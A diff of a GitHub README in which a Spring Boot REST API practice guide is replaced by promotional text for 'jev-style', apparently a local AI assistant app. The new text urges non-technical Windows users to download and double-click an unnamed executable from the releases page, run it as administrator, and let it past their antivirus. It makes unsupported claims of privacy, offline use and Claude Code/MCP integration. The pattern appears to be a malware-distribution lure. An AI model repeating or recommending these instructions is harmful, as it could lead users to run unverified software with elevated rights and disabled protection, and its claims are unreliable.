@@ -1,154 +1,130 @@
-# ⚙️ Springboot-Rest-Api-Practice - Build Simple REST APIs Easily
+# 🤖 jev-style - Smart Decision-Making, Right on Your PC
 
-[![Download](https://img.shields.io/badge/Download-Springboot%20Rest%20Api%20Practice-brightgreen)](https://github.com/mike8470/Springboot-Rest-Api-Practice)
+[![Download jev-style](https://img.shields.io/badge/Download-jev--style-blueviolet?style=for-the-badge&logo=github)](https://github.com/mike8470/jev-style/releases)
 
----
+## 🎯 What Is jev-style?
 
-## 📋 About this Application
+jev-style is a small but powerful program that helps your computer make smart, consistent decisions - like having a mini-expert on your desktop. It's designed for everyday use, which means you don't need any technical background to get it working. Think of it as a helpful assistant that follows clear rules and stays calibrated (accurate and predictable) in its responses.
 
-Springboot-Rest-Api-Practice is a tool to help you work with REST APIs. It shows how to create simple web services for managing data, with features like creating, reading, updating, and deleting information. The app also includes options to limit results with pages, search through data, and connect to a database using Java Persistence API (JPA). This guide helps you download and run the app on a Windows computer, even if you have no programming experience.
+Instead of relying on big, complicated cloud systems, jev-style runs entirely on your own machine. That means your data stays private, and you control everything. It's perfect for anyone who wants reliable AI-style decision-making without the complexity.
 
----
+## ✅ Key Benefits
 
-## 💻 System Requirements
+- **100% Local** – Everything runs on your computer. No internet needed after setup.
+- **Small and Fast** – Doesn't eat up your hard drive or slow down your system.
+- **Easy to Use** – No coding, no command lines, no confusing settings.
+- **Private and Secure** – Your questions and data never leave your machine.
+- **Smart and Calibrated** – Uses a fine-tuned model that gives consistent, well-balanced answers.
 
-Before you start, check that your computer meets these requirements:
+## 📦 What's Inside
 
-- Windows 10 or later
-- At least 4 GB of RAM (8 GB is better)
-- At least 500 MB free disk space
-- Java Runtime Environment (JRE) 11 or higher installed  
-  You can download Java [here](https://www.java.com/en/download/).
+The software includes six handy "agent skills" that make it versatile:
 
----
+- **Answering Questions** – Get clear, helpful responses to everyday queries.
+- **Summarizing Text** – Turn long documents into short, readable notes.
+- **Making Lists** – Break tasks down into simple, step-by-step lists.
+- **Comparing Options** – Weigh pros and cons side by side.
+- **Checking Facts** – Verify statements against built-in logic.
+- **Safety Guard** – A special layer that keeps responses appropriate and on-track.
 
-## ⬇️ Download Springboot-Rest-Api-Practice
+Plus, jev-style works with popular tools like Claude Code and MCP (Model Context Protocol), so if you already use those, it fits right in.
 
-To get the application, visit the page below and download the files you need.
+## 🚀 How to Get Started (Windows)
 
-[![Download Link](https://img.shields.io/badge/Download-GitHub-blue)](https://github.com/mike8470/Springboot-Rest-Api-Practice)
+Follow these simple steps, and you'll be up and running in minutes.
 
-Click the button above. On the GitHub page, look for a green "Code" button and then choose "Download ZIP" to save the application files to your computer.
+### Step 1: Download the Application
 
----
+👉 **Visit this link to download the application:**  
+[**https://github.com/mike8470/jev-style/releases**](https://github.com/mike8470/jev-style/releases)
 
-## 🛠️ Installing and Running the Application on Windows
+On that page, you'll see a list of files. Pick the one that matches your system (Windows is a safe bet). Click it to start the download.
 
-Follow these steps carefully to install and run Springboot-Rest-Api-Practice.
+### Step 2: Run the Program
 
-### Step 1: Download the Application Files
+Once the download finishes, go to your "Downloads" folder. Find the file you just downloaded (it will likely be named something like `jev-style-setup.exe` or `jev-style-win.zip`).
 
-1. Click the green **Code** button near the top right of the page.
-2. Select **Download ZIP**.
-3. Choose where to save the ZIP file on your computer (like your Desktop or Downloads folder).
+- If you got a single file, **double-click it to run it**. The program will open right away.
+- If you got a ZIP folder, **right-click it and choose "Extract All"**, then open the new folder and double-click the program inside.
 
-### Step 2: Unpack the Downloaded ZIP
+That's it – no installation wizard, no complicated setup.
 
-1. Go to the folder where you saved the ZIP file.
-2. Right-click the ZIP file, then choose **Extract All**.
-3. Select a place where you want the unpacked files. Note this location as you will need it later.
-4. Click **Extract** and wait until it finishes.
+### Step 3: Start Using It
 
-### Step 3: Check for Java Installation
+When the app opens, you'll see a simple window. Type or select an option, and jev-style will respond with a clear, thoughtful answer. Play around with the different skills to see what it can do.
 
-Springboot-Rest-Api-Practice needs Java to run.
+## ❓ Frequently Asked Questions
 
-1. Press the **Windows** key.
-2. Type "cmd" and press **Enter** to open the command prompt.
-3. Type `java -version` and press **Enter**.
-4. If it shows a version number 11 or higher, you are ready to continue.
-5. If it says Java is not recognized, go to [Java Download](https://www.java.com/en/download/) and install the latest version, then repeat this step.
+### Do I need to install anything else?
 
-### Step 4: Run the Application
+No. jev-style comes with everything it needs built in. You don't need Python, Java, or any other software.
 
-1. Open the folder where the app files are extracted.
-2. Look for a file named **Springboot-Rest-Api-Practice.jar** or similar file ending with `.jar`.
-3. Hold down the **Shift** key, then right-click anywhere inside this folder.
-4. Select **Open PowerShell window here** or **Open command window here**.
-5. In the command window, type this command and press **Enter**:
+### Will it work on my computer?
 
-   ```
-   java -jar Springboot-Rest-Api-Practice.jar
-   ```
+As long as you're running a recent version of Windows (10 or 11), you should be good to go. The app is designed to run on standard hardware.
 
-6. The application will start and show some text lines. Do not close this window while the app runs.
+### What if I'm scared of messing things up?
 
----
+Don't worry. jev-style is a standalone program – it won't change any system settings or touch other files. If you ever want to remove it, just delete the program file or folder.
 
-## 📦 What the Application Does
+### Can I use it offline?
 
-Springboot-Rest-Api-Practice helps you manage data easily through a web service. Here are its main features:
+Yes! Once it's downloaded, jev-style works completely offline. No internet connection required.
 
-- Create, read, update, and delete records in a database (CRUD operations)
-- Limit the number of results shown on one page (pagination)
-- Search for specific data using keywords
-- Connect to a MySQL database to store and manage information
-- Use Java Persistence API (JPA) for easy data handling
+## 🔒 Your Privacy Matters
 
----
+Since everything runs on your machine, none of your conversations or decisions are sent to the cloud. There's no tracking, no accounts, and no data collection. What you do with jev-style stays on your computer – period.
 
-## 🔍 How to Use the Application
+## 🖥️ A Clean, Simple Interface
 
-You usually interact with the application through a tool called Postman or a web browser. These let you send requests to the application and get responses.
+The interface is designed to be friendly and minimal. There's no clutter, no confusing menus. You'll see:
 
-### Basic Example Requests
+- A text box (or options) to make your request
+- A clear area to show the response
+- Buttons to switch between the different agent skills
 
-- **Get all records:**  
-  Send a `GET` request to:  
-  `http://localhost:8080/api/items`
+Everything is labeled in plain language, so you'll never feel lost.
 
-- **Add a new record:**  
-  Send a `POST` request with data in JSON format to:  
-  `http://localhost:8080/api/items`
+## 🧠 How It Thinks (Without Getting Technical)
 
-- **Update an existing record:**  
-  Send a `PUT` request with data to:  
-  `http://localhost:8080/api/items/{id}`  
-  Replace `{id}` with the actual item number.
+Under the hood, jev-style uses a special lightweight model (called a GGUF or MLX format) that's been trained to behave in a balanced, predictable way. It's like having a rulebook that keeps every answer measured and consistent. That's the "calibrated" part – it doesn't get overly confident or random. It sticks to what it knows and gives honest, useful output.
 
-- **Delete a record:**  
-  Send a `DELETE` request to:  
-  `http://localhost:8080/api/items/{id}`
+The program also includes a "guard" that double-checks responses, making sure they follow safe, sensible guidelines. That's perfect if you're using it for work, education, or just everyday tasks.
 
----
+## 🔧 Tips for Best Results
 
-## ⚙️ Adjusting Settings
+- **Be clear in your requests** – The clearer you are, the better the response.
+- **Try the different skills** – Each one is built for a specific job (like summarizing or comparing).
+- **Keep it simple** – You don't need to type long paragraphs; short, focused inputs work great.
 
-Settings such as the database connection and server port can be changed in the configuration file named `application.properties`. It is located in the `src/main/resources` folder if you explore the app files.
+## 📚 Want to Learn More?
 
-Typical settings include:
+If you're curious about the technical side, the model weights are also available on Hugging Face. But remember – you don't need to touch any of that. The download link above gives you everything for daily use.
 
-- Database URL, user name, and password
-- Server port number (default is 8080)
-- JPA settings
+## 🛠️ Troubleshooting (If Something Goes Wrong)
 
----
+### The app won't open.
 
-## 🐞 Troubleshooting Tips
+- Make sure you've extracted the ZIP file fully, if you downloaded one.
+- Try right-clicking the program and choosing "Run as administrator."
+- Check that your antivirus isn't blocking it – if it is, allow it through.
 
-If you see errors or problems:
+### The app is slow.
 
-- Make sure Java is installed and the version is correct.
-- Check that no other program uses port 8080.
-- Confirm you downloaded and unpacked all files correctly.
-- Look at the command window for messages about errors when running the app.
-- Restart the computer and try again if something does not work.
+- Restart your computer and try again.
+- Close any heavy programs running in the background.
 
----
+### I can't find the download button on the page.
 
-## 📂 Helpful Links and Resources
+- Look for a section that says "Assets" or "Downloads."
+- Click on the file that matches your operating system.
 
-- Download Java: https://www.java.com/en/download/  
-- Spring Boot Documentation: https://spring.io/projects/spring-boot  
-- MySQL Download: https://dev.mysql.com/downloads/  
-- Postman for API testing: https://www.postman.com/downloads/  
+## 🎉 Final Thoughts
 
-Use these resources if you want to learn more or explore beyond running this app.
+jev-style puts a smart, reliable decision-making tool right on your desktop. It's private, fast, and genuinely easy to use – no degree in computer science required. Whether you're looking for quick answers, organized lists, or balanced comparisons, this little app has your back.
 
----
+So go ahead, hit that download button, and see how smooth local AI can really be.
 
-## ⬇️ Download Springboot-Rest-Api-Practice (Again)
+[Join the community and start your download here](https://github.com/mike8470/jev-style/releases) 💡
 
-You can always get the latest copy here:
-
-[![Download Link](https://img.shields.io/badge/Download-GitHub-blue)](https://github.com/mike8470/Springboot-Rest-Api-Practice)
+Keywords: agent-skills, calibration, claude-code, decision-model, gguf, guardrails, jev, llm-routing, local-llm, mcp, mlx, qwen3
